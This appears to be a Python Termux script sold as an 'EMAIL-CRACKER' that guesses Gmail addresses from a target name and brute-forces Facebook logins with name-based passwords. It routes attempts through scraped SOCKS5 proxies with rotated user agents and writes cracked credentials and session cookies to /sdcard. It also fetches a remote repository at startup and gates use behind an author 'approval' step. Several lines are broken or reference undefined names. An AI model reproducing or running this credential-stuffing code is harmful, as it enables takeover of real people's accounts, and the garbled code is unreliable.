#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
#------------[ ALL-COLOR ]--------------#
from bs4 import BeautifulSoup
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[1;97m'	
II='\x1b[1;32m'
I='\033[1;32m'
C='\x1b[1;36m'
M='\033[1;91m'
U='\x1b[1;35m'
K='\033[1;33m'
N='\033[1;32m'
P='\x1b[1;97m'
H='\x1b[1;94m'
Q="\x1b[00m"
O='\033[38;2;255;127;0;1m'
B = '\x1b[1;94m'
wasr = f"{Q}[{I}•{Q}]-->"
wa = f"{Q}[{I}•{Q}]"


my_color = [P,M,H,K,B,U,O,N,II,I,C,M,U,K,N,P,H,Q,O,B]
wx = random.choice(my_color)

II='\x1b[1;32m'
I='\033[1;32m'
C='\x1b[1;36m'
M='\033[1;91m'
U='\x1b[0;35m'
K='\033[1;33m'
N='\033[1;32m'
P='\x1b[00m'
H='\x1b[0;94m'
Q="\x1b[00m"
O='\033[38;2;255;127;0;1m'
B = '\x1b[0;94m'
war = f"{Q}[{I}•{Q}]-->"
wa = f"{Q}[{I}•{Q}]"
my_color = [II,Q,I,
 P, M, H, K, B, U, O]
#warna = random.choice(my_color)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m'
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
###---[ IMPORT MODULE ]---###

import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try: import requests
except ModuleNotFoundError:print("[!] Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("[!] Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("[!] Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")
def Audio_(x):
	try:os.system("play-audio "+x)
	except:pass

os.system('mkdir data')
os.system('pkg install play-audio')
os.system('git clone https://github.com/noobboss1/data')
def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def pkg_():

    love="×<===>×786"

    noob___mamun__="N00B_B0SS"

    os.system('clear')

    print (f"""
	%s   _  _____  ___  ___ %s ___  ___  ________
	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
	 %s/    / // / // / _  / _  / // /\ \_\ \  
	%s/_/|_/\___/\___/____/____/%s\___/___/___/  

	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))

    try:

        ___mamun__1=open('/data/data/com.termux/files/usr/bin/.termux-cov', 'r').read()

    except IOError:

        os.system("clear")

        print (f"""
	%s   _  _____  ___  ___ %s ___  ___  ________
	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
	 %s/    / // / // / _  / _  / // /\ \_\ \  
	%s/_/|_/\___/\___/____/____/%s\___/___/___/  

	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))

        print(f"{II}_{Q}"*57+'\n')

        print (" YOUR ID NOT APPROVED \n")

        print (" THIS YOUR ID COPY NOW👇     ")

        print(f"{II}_{Q}"*57)

        myid=uuid.uuid4().hex[:15].upper()

        print ("\n YOUR ID : "+noob___mamun__+myid+love)

        print(f"{II}_{Q}"*57)

        kok=open('/data/data/com.termux/files/usr/bin/.termux-cov', 'w')

        kok.write(myid+love)

        kok.close()
        

        print (" YOUR ID COPY AND SEND TO ADMIN \n")

        print(f"{II}_{Q}"*57)

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20___mamun__%20%20:%20'+noob___mamun__+''+myid+''+ love

        os.system('xdg-open https://www.facebook.com/mamunahmed.fahim.5')
        os.system('am start https://wa.me/+8801715650048?text=' + tks)

        

    r1=requests.get("https://raw.githubusercontent.com/noobboss1/main/main/x/c/h/error/file.txt").text

    if ___mamun__1 in r1:

        menu()

    else:

        os.system("clear")

        print (f"""
	%s   _  _____  ___  ___ %s ___  ___  ________
	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
	 %s/    / // / // / _  / _  / // /\ \_\ \  
	%s/_/|_/\___/\___/____/____/%s\___/___/___/  

	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))

        print(f"{II}_{Q}"*57)

        print (" YOUR ID NOT APPROVED \n")
        print (" THIS YOUR ID COPY NOW 👇\n")

        print(f"{II}_{Q}"*57+'\n')

        print (" YOUR ID : "+noob___mamun__+___mamun__1)
        print(f"{II}_{Q}"*57)

        print (" YOUR ID COPY AND SEND TO ADMIN \n")

        print(f"{II}_{Q}"*57)
        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20___mamun__%20To%20Premium✓✓%20%20%20%20%20My%20%20___mamun__%20%20:%20'+noob___mamun__+''+___mamun__1

        os.system('xdg-open https://www.facebook.com/mamunahmed.fahim.5')
        os.system('am start https://wa.me/+8801715650048?text=' + tks)

print(f"""
	%s   _  _____  ___  ___ %s ___  ___  ________
	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
	 %s/    / // / // / _  / _  / // /\ \_\ \  
	%s/_/|_/\___/\___/____/____/%s\___/___/___/  

	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))
		


def join_to_id(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :noobdatex = '2009'
		elif fx[:9] in ['100000000']       :noobdatex = '2009'
		elif fx[:8] in ['10000000']        :noobdatex = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:noobdatex = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:noobdatex = '2010'
		elif fx[:6] in ['100001']          :noobdatex = '2010-2011'
		elif fx[:6] in ['100002','100003'] :noobdatex = '2011-2012'
		elif fx[:6] in ['100004']          :noobdatex = '2012-2013'
		elif fx[:6] in ['100005','100006'] :noobdatex = '2013-2014'
		elif fx[:6] in ['100007','100008'] :noobdatex = '2014-2015'
		elif fx[:6] in ['100009']          :noobdatex = '2015'
		elif fx[:5] in ['10001']           :noobdatex = '2015-2016'
		elif fx[:5] in ['10002']           :noobdatex = '2016-2017'
		elif fx[:5] in ['10003']           :noobdatex = '2018'
		elif fx[:5] in ['10004']           :noobdatex = '2019'
		elif fx[:5] in ['10005']           :noobdatex = '2020'
		elif fx[:5] in ['10006','10007','10008']:noobdatex = '2021-2022'
		else:noobdatex=''
	elif len(fx) in [9,10]:
		noobdatex = '2008-2009'
	elif len(fx)==8:
		noobdatex = '2007-2008'
	elif len(fx)==7:
		noobdatex = '2006-2007'
	else:noobdatex=''
	return noobdatex

###---[ANGGAP INI LOGO ]---###
def logo():
	return str(f"""
	%s   _  _____  ___  ___ %s ___  ___  ________
	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
	 %s/    / // / // / _  / _  / // /\ \_\ \  
	%s/_/|_/\___/\___/____/____/%s\___/___/___/  

	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))
            

###---[ MONTH YEAR ]---###
monthx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = monthx[xx]
tahun = now.year

sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
join_id_date=random.choice([H,K,M,O,B,U])



###---[ APPEND ]---###
dump, passwrodx, methods = [], [], []

uai=[]
id, id2, loop ,ok , cp = [], [], 0, 0, 0





###---[ CLEAR LAYAR ]---###
def clearscreen():
	try:os.system('clear')
	except:pass
	

###---[ AUTO CREATE UA & PROXY ]---###
try:
	clearscreen()
	
	try:os.remove('.proxy.txt')
	except:pass

	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f" [{M}>{P}] INTERNET CONNECTION ERROR")
	os.system('clear')






###---[ MAIN MENU ]---###
def menu():
	clearscreen()
	Audio_('data/.welcome.mp3')
#	os.system('xdg-open https://github.com/noobboss1')
	
	print(f"""
	%s   _  _____  ___  ___ %s ___  ___  ________
	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
	 %s/    / // / // / _  / _  / // /\ \_\ \  
	%s/_/|_/\___/\___/____/____/%s\___/___/___/  

	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : MULTI-CRACK \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))
	print(54*f'{II}_')
	print('\033[47m\033[1;31m                     MAIN MENU                       |\033[00m\033[00m')
	Audio_('data/.main_menu.mp3')
	print(f"\n {P}[{hh}01{P}] CRACKING FROM EMAIL\n")
	
	print(f" [{hh}02{P}] CRACKING FROM FILE \n")
	print(f" [{hh}00{P}] LOGOUT ")
	print(54*f'{II}_')
	Audio_('data/.choice.mp3')
	
	ask = input(f' {wa} CHOICE AN OPTION : ')	
	
	
	
	
if ask in ['1','01']:
exit()

	elif ask in ['2','02']:
exit()
	
	elif ask in ['0','00']:
exit()
	elif ask in ['',' ',]:Audio_('data/.wrong.mp3')
	    exit(f" [{M}>{P}] PLEASE CORRECT INPUT")
	else:menu(f" [{M}>{P}] TATA BYE BYE")
	
def clon_email():
	#os.system('xdg-open https://www.facebook.com/mamunahmed.fahim.5')
	rc = random.choice
	rr = random.randint
	bas = ['akther','begum','nusrat','khanom','mst','ahmed','miah','chy','talukder','sayed','khan','rayhan','sabbir','muhammad','radika','foysal','mamun','fahim','fahima','ahmed','sultana','afsana','aditya','farjana','sabina','tasnima','tasnim','rabby','farhana','farhan','fokhrul','noyon','gaming']
	blk = ['999','official','gaming','123','1234','12345','123456']
	print(54*f'{II}_')
	




	print(f' {wa} YOUR TARGET EMAIL USER NAME')
	print(54*f'{II}_')
	Audio_('data/.targetem.mp3')
	namx = input(f' {wa} TARGET EMAIL NAME : ')
	
	
	if ',' in str(namx):
		Audio_('data/.wrong.mp3')
		exit(f' [{M}<{P}] PLEASE CORRECT INPUT ')
	Audio_('data/.dump.mp3')
	maildomain = "@gmail.com"
	if '@' not in str(maildomain) or '.com' not in str(maildomain):
		exit(f' [{M}<{P}] off')
	number_id = (15000)
	
	
	
	for noobin in range(int(number_id)):
		A = namx
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{noobin}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = maildomain
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+namx)
		if len(dump)==10000:noobbmain()
		
		print(f'\r {wa} ID DUMP PROCESS <=> %s'%wx,(len(dump)),end='')
		sys.stdout.flush()
	noobbmain()	


def crack_filexx():
	print(54*f'{II}_')
	Audio_('data/.filepath.mp3')
	file = input(f' {wa} PLEASE SELECT YOUR FILE PATH \n {wa} FILE PATH : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:idf,namx = data.split('|')
			except:exit()Audio_('data/.wrong.mp3');exit(f" {wa} WRONG INPUT ")
			dump.append(data)
			
			print(f'\r {wa} ID DUMP PROCESS <=> %s'%(len(dump)),end=" ")
			sleep(0.0003)
	except FileNotFoundError:exit(f" {wa} ID NOT FOUND ")
	print(f'\n {wa} TOTAL FILE ID : {len(dump)}')
	noobbmain()


def crack_file():
	print(54*f'{II}_')
	Audio_('data/.filepath.mp3')
	file = input('\x1b[1;97m [] FILE NAME : ')
	print('')
	try:uuid = open(file).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
	#	back()
	for data in uuid:
		dump.append(data)
	noobbmain()
	

accountok = []
def noobbmain():
	#os.system('xdg-open https://facebook.com/groups/737172040863921/')
	print("\n"+54*f'{II}_')
	print (f" {P}[{hh}1{P}] METHOD {P}[{II}BEST{P}]{P} ")
	Audio_('data/.methodbest.mp3')
	print(54*f'{II}_')
	Audio_('data/.choice.mp3')
	ro = input(f'\n {wa} CHOICE AN OPTION : ')
	print(54*f'{II}_')
	if ro in ['1','01']:methods.append('mobile')
	elif ro in ['2','02']:methods.append('free')
	else:methods.append('mobile')

	ch = "R"
	if ch in ['o','O']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	elif ch in ['r','R']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	
	
	cp = "NO"
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	
	apk = "NO"
	if apk in ['y','Ya','ya','1']:accountok.append('apk')
	else:accountok.append('coookie_xxx')
	
	ch = "3"
	if ch in ['1','01']:autopass()
	elif ch in ['2','2']:gabung()
	elif ch in ['3','03']:autopass()
	else:autopass()
	
from datetime import datetime    	
###---[ ATUR PASSWORD ]---###

def autopass():
	global ok,cp 
	Audio_('data/.cracking.mp3')
	print(f' {H}SAVE SDCARD : {sim_ok}\n {K}SAVE SDCARD : {sim_cp}');print(54*f'{II}_')
	
	
	
	
	
	time_xx = datetime.now()
	with tred(max_workers=30) as noob_s:
		for akun in id:
			idf,namx = akun.split('|')[0],akun.split('|')[1].lower()
			noob_pass1 = namx.split(" ")[0]
			pwx = []
			if len(namx)<=5:
				if len(noob_pass1)<=1 or len(noob_pass1)<=2:
					pass 
				else:
					pwx.append(noob_pass1+"123")
					pwx.append(noob_pass1+"143")
					pwx.append(noob_pass1+"1234")
				
			else:
				if len(noob_pass1)<=1 or len(noob_pass1)<=2:
					try:
						noob_pass2 = namx.split("")[1]
						if len(noob_pass2)<=3:
							pass
						else:
							pwx.append(noob_pass2+"123")
							pwx.append(noob_pass2+"143")
							pwx.append(noob_pass2+"1234")
							pwx.append(noob_pass1+"12345")
							pwx.append(namx)
					except:
						try:
							noob_pass3 = namx.split('')[2]
							if len(noob_pass3)<=3:pass
							else:
								pwx.append(noob_pass3+"123")
								pwx.append(noob_pass3+"143")
								pwx.append(noob_pass3+"1234")
								pwx.append(noob_pass3+"12345")
								pwx.append(namx)
						except:pwx.append(namx)
				else:
					pwx.append(namx)
					pwx.append(noob_pass1+"123")
					pwx.append(noob_pass1+"143")
					pwx.append(noob_pass1+"1234")
					pwx.append(noob_pass1+"12345")
					
			if 'mobile' in methods:
				noob_s.submit(crack,idf,pwx,"m.facebook.com",time_xx)
			elif 'p' in methods:
				noob_s.submit(crack1,idf,pwx,"m.facebook.com",time_xx)
			else:
				noob_s.submit(crack,idf,pwx,"m.facebook.com",time_xx)
	sleep(5)
	exit(f'\r [{hh}<_{P}] CRACKING COMPLETED TOTAL OK:{ok} TOTAL CP:{cp} ')
	
				




###---[ MENU CRACK ]---###
requ_ok = []
requ_cp = []
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
def crack(idf,pwx,url,time_xx):
	global loop,ok,cp,random
	
	
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-time_xx).split('.')[0]
	
	uai = random.choice(["Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 9; ZTE Blade A3 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/339.0.0.10.100;]","Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI Y560-L01 Build/HUAWEIY560-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/340.0.0.9.76;]","Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; Nokia 2 V Tella Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; 4063F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]","Mozilla/5.0 (Linux; Android 11; EC211003 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; Note 8P Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/279.0.0.10.118;]","Mozilla/5.0 (Linux; Android 12; TECNO KH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 8.1.0; Plume L2 Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3624 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/338.0.0.10.102;]","Mozilla/5.0 (Linux; Android 9; Mi MIX 3 5G Build/PKQ1.190321.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; Note 9P Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; M8L PLUS Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]"])
	uai2 = random.choice(["Mozilla/5.0 (Linux; Android 12; CPH2471 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 9; ZTE Blade A3 Lite Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/339.0.0.10.100;]","Mozilla/5.0 (Linux; Android 5.1.1; HUAWEI Y560-L01 Build/HUAWEIY560-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/340.0.0.9.76;]","Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; Nokia 2 V Tella Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; 4063F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]","Mozilla/5.0 (Linux; Android 11; EC211003 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; Note 8P Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/279.0.0.10.118;]","Mozilla/5.0 (Linux; Android 12; TECNO KH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 8.1.0; Plume L2 Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3624 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/338.0.0.10.102;]","Mozilla/5.0 (Linux; Android 9; Mi MIX 3 5G Build/PKQ1.190321.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 10; Note 9P Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; M8L PLUS Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]"])
	my_color = [II,Q,I,P,H, M, H, K, B, U, O, N]
	wx = random.choice(my_color)
	print(f"\r {P}[{wx}N00B B0SS{P}] %s/%s {P}OK:%s "%(loop,len(id),ok),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			ses.headers.update({"Host": url,"upgrade-insecure-requests":"1","user-agent":f"{uai}","accept":"*/*","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			get_method = ses.get(f"https://m.facebook.com/").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			post_method = ses.post(f"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100",data=date, headers=head)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in requ_cp:pass
				else:
						try:
							
							
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n [{kk}B0SS : {kk}{idf}|{pw}{p}')
						#	Audio_('cp.mp3')
							open('/sdcard/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				coookie_xxx = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', coookie_xxx)[0]
				data = (f'{idf}|{pw}')
				if data in requ_ok:pass
				else:
					requ_ok.append(data)
					ok+=1
					open('/sdcard/'+sim_ok,'a').write(data+'\n');Audio_('data/.bossok.mp3')
					if "coookie_xxx" in accountok:
						print(f"\n \033[42m\033[1;91m B0SS \033[00m\033[00m:%s %s|%s \n {wa} %s•%s "%(II, idf , pw ,join_id_date,join_to_id(idf)))
						print(f"\r \033[47m\033[1;31m COOKIE \033[00m\033[00m: %s%s"%(I, coookie_xxx ))
						

						break
					
			else:
				continue
